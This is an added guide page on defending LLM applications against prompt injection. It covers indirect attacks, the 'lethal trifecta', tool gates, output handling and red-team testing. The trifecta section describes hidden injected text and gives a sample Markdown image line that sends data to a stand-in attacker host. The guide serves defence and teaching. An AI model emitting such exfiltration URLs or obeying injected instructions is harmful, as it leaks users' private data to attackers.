@@ -1,0 +1,150 @@
+---
+title: Guardrails and Prompt-Injection Defence
+summary: Why prompt injection has no complete fix and how to build safely anyway — direct and indirect attacks, the lethal trifecta, layered guardrails, tool gates in code, safe output handling, and testing against attackers.
+track: ai-engineering
+order: 38
+tags: [ai-engineering, llm, security, guardrails, agents]
+aliases: [prompt injection, indirect prompt injection, direct prompt injection, jailbreak, guardrails, llm security, llm guardrails, owasp llm top 10, llm01, lethal trifecta, excessive agency, data exfiltration llm, markdown image exfiltration, system prompt leak, spotlighting, instruction hierarchy, human in the loop, pii filtering llm, moderation, red teaming llm, improper output handling]
+prerequisites: [ai-engineering/llm-fundamentals, ai-engineering/agents-and-tool-calling]
+related: [ai-engineering/rag, ai-engineering/llm-system-design, ai-engineering/llm-evaluation, backend/authn-authz]
+quickRef:
+  points:
+    - '**Prompt injection** is text that makes a model follow an attacker''s instructions. **Indirect** injection hides in content the model reads, such as email, web pages and documents.'
+    - 'There is **no known complete fix**, because a model reads instructions and data in the same stream.'
+    - 'Design as if the model **will** be fooled, and limit what a fooled model can do.'
+    - '**Lethal trifecta:** private data + untrusted content + a way to send data out. Never allow all three unchecked.'
+    - 'Enforce permissions, tool limits and output checks **in code**, where a prompt cannot change them. Use the user''s permissions, never a super-user''s.'
+    - 'Treat model output as **untrusted input** to everything after it: HTML, SQL, shell, URLs.'
+  useWhen: 'Any LLM feature that reads outside content, holds private data, or can take actions.'
+askedAt:
+  - company: Google
+    year: 2026
+    round: Role-related knowledge, Cloud AI engineer
+    source: https://leetcode.com/discuss/post/8583957/recent-google-interview-experience-for-g-gkmp/
+  - company: Amazon
+    year: 2026
+    round: GenAI round
+    source: https://leetcode.com/discuss/post/8542502/software-development-engineer-i-amazon-i-tusz/
+lastReviewed: 2026-11-09
+---
+
+## Why it matters
+
+Prompt injection is number one in the OWASP Top 10 for LLM applications. It matters more every year because models are now connected to inboxes, databases and payment tools. A chatbot that says something rude is embarrassing. An agent tricked into emailing your customer list is a breach.
+
+It is also unusual as a security problem. SQL injection was solved by parameterised queries, which separate code from data. **LLMs have no equivalent.** OWASP states that "it is unclear if there are fool-proof methods of prevention for prompt injection", and that RAG and fine-tuning don't fully mitigate it. So the engineering question changes: not "how do I stop it?" but "what's the worst that can happen when it works?"
+
+<Callout type="analogy">
+A very capable new assistant who believes every note they are handed. You can tell them "ignore notes from strangers", and that helps, but a convincing note will still fool them sometimes. So you also don't give them the keys to the safe, and any payment over a limit needs a manager's signature. The safeguards don't depend on the assistant's judgement.
+</Callout>
+
+## Two ways in
+
+| | Direct | Indirect |
+|---|---|---|
+| Comes from | The user typing to the model | Content the model reads: web page, PDF, email, RAG chunk, tool output |
+| Attacker needs | Access to the chat | Only to get text somewhere the model will read it |
+| Victim | Usually the operator (policy bypass, leaked prompt) | Often another, innocent user |
+| Typical result | Jailbreak, off-topic use | Data theft, unauthorised actions |
+
+Indirect injection is the dangerous one. The attack text can be hidden from people, in white-on-white text, HTML comments or image metadata, and the user who triggers it did nothing wrong.
+
+<Walkthrough id="guard-indirect-injection" />
+
+## The lethal trifecta
+
+Simon Willison's term for the combination that lets an attacker steal data. An agent is at risk if it has all three:
+
+1. **Access to private data**
+2. **Exposure to untrusted content**, meaning anything an attacker could influence
+3. **A way to communicate externally**: sending email, calling a URL, even rendering an image
+
+Remove any one and the theft path breaks. Reading the third one carefully is what catches people out: if your chat UI renders Markdown images, `![](https://evil.example/?data=...)` sends data to the attacker the moment it is displayed, with no click.
+
+## Defence in layers
+
+<Diagram id="guard-layers" caption="Each tool call goes through the gate, and the model may loop through it several times before answering. The gate and output checks, in plain code, are what limit the damage when an attack gets through." />
+
+The important distinction is between defences that lower the odds and those that set a hard limit.
+
+| Layer | Examples | Kind |
+|---|---|---|
+| Input filters | Size limits, moderation, attack classifiers | Probabilistic; attackers adapt |
+| Prompt design | Role and limits in the system prompt, wrap untrusted text in labelled delimiters | Probabilistic; helps, not sufficient |
+| **Least privilege** | Per-user credentials, read-only by default, few tools | **Hard limit** |
+| **Tool gate** | Allowlist, argument checks, block sensitive actions after untrusted input | **Hard limit** |
+| **Human approval** | Confirmation for payments, deletes and external sends | **Hard limit**, if people really read it |
+| **Output handling** | Schema validation, URL allowlist, escape before rendering | **Hard limit** |
+| Monitoring and red-teaming | Log tool calls, alert on denied actions, run attack sets in CI | Finds what got past |
+
+A detection rate of 95% sounds good, and it is a failing grade in security: an attacker can simply retry until one attempt works. Use classifiers to reduce noise. Don't count on them as the boundary.
+
+## Controlling tools in code
+
+The model only *proposes* a tool call; your application decides. This gate tracks what the session has been exposed to, so it needs no understanding of the text.
+
+<CodeTabs id="guard-tool-gate" title="A tool gate that tracks untrusted content" />
+
+Further rules that belong in code:
+
+- **Act with the end user's permissions.** Use their token or scope the query to their tenant. A model holding a super-user credential can be talked into using it.
+- **Handle privileged functions in code**, not in the prompt. "Only admins may do this" in a prompt is not access control.
+- **Validate arguments**: an allowlist of recipients, a limit on amounts, no wildcard deletes.
+- **Keep the system prompt free of secrets.** Assume users can extract it. It is not a security boundary.
+
+## Treat output as untrusted
+
+Model output is attacker-influenced data. Everything that consumes it needs the usual protection:
+
+| Output goes to | Risk | Do this |
+|---|---|---|
+| A web page | XSS | Escape it; sanitise any Markdown or HTML |
+| Rendered Markdown | Data theft through image URLs | Allowlist hosts, or don't render images |
+| A SQL query | Injection, reading other tenants | Read-only role, row-level security, parameterised queries |
+| A shell or interpreter | Remote code execution | A sandbox with no network or secrets |
+| Another agent | Injection passed along | Treat it as untrusted too |
+
+<CodeTabs id="guard-output-filter" title="Deterministic checks on model output" />
+
+## Guardrails beyond injection
+
+| Guardrail | Purpose | Note |
+|---|---|---|
+| Personal data handling | Keep personal data out of prompts, logs and answers | Redact before sending, not only after |
+| Moderation | Block harmful content in and out | Tune per product; over-blocking hurts too |
+| Topic limits | A banking bot shouldn't write poems | A cost and brand control more than a security one |
+| Grounding | Answers must be supported by sources | See [evaluation](../llm-evaluation/) |
+| Spend limits | One user can't run up the bill | OWASP lists this as unbounded consumption |
+
+**Streaming complicates this.** Output checks need text to inspect, but tokens are already on the user's screen. Common answers: run fast checks on each sentence as it arrives, hold back rendering of links and images until the message is complete, and be able to retract a message.
+
+**Decide how each guardrail fails.** If a moderation service is down, do you block (fail closed) or continue (fail open)? For anything guarding security or money, fail closed.
+
+## Testing it
+
+- Keep an **attack set** in your [evals](../llm-evaluation/): known injections, hidden text in documents, and requests for other users' data. Run it in CI.
+- **Measure both error types.** A guardrail blocking 20% of legitimate requests is also a failure.
+- **Test the blast radius**, not only detection: assume the model was fooled, and check what it could actually do.
+- **Red-team with people.** Attackers adapt to fixed lists, and published research regularly breaks defences that scored well on static tests.
+
+<Pitfalls>
+
+- **Trusting the system prompt** as a security control.
+- **Giving the agent a shared admin credential.**
+- **Treating RAG content as trusted.** Anyone who can edit a wiki page can write to your prompt.
+- **Rendering model output as raw HTML or Markdown** with images.
+- **Stopping at a classifier** because it scored 95%.
+- **Approval prompts people click through.** Show exactly what will happen, and use them rarely.
+- **Logging full prompts** with personal data in them.
+
+</Pitfalls>
+
+<KeyTakeaways>
+
+- Prompt injection has no complete fix; assume the model can be fooled.
+- Don't combine private data, untrusted content and a way out without a hard check.
+- Hard limits live in code: least privilege, tool gates, human approval, output handling.
+- Treat model output as untrusted input to the next system.
+- Test what a fooled model could do, and keep attack cases in your evals.
+
+</KeyTakeaways>
